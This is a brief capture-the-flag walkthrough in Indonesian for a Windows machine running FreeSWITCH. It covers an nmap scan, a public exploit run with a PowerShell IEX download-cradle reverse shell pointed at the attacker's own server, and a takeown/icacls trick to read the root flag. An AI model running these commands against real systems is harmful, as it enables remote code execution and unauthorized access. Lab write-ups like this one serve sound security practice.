1. scan nmap -> freeswitch buka -> cari aja exploit nya
2. python3 exp.py ip command -> ini command revshell
3. "cmd /c powershell IEX (New-Object Net.WebClient).DownloadString('http://ipmu:port_servermu/namaexploit.ps1')"
4. gas nyalain nc ama python server di file exploit nya
5. klaim flag cari aja di desktop


pe: 
1. command ini : takeown /R /F *.* -> sama ini : icacls "root.txt" /q /c /t /grant Users:F -> hasil baca wu klaim root aja dah
